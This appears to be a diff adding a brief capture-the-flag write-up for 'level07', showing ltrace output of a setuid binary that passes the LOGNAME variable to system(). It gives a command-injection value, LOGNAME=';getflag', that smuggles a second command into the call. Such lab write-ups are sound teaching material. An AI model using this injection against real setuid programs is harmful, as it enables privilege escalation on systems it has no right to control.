@@ -1,0 +1,8 @@
+by inspecting the level07 binary with ltrace we can see that the binary is executing with setuid permission:
+	setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                        = 0
+	setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                        = 0
+then we see that LOGNAME env variable is acceded and reuse with /usr/bin/echo:
+	getenv("LOGNAME")                                                          = "flag07"
+	system("/bin/echo flag07 "flag07
+so we juste have to set our own LOGNAME with 
+	LOGNAME=';getflag' ./level07
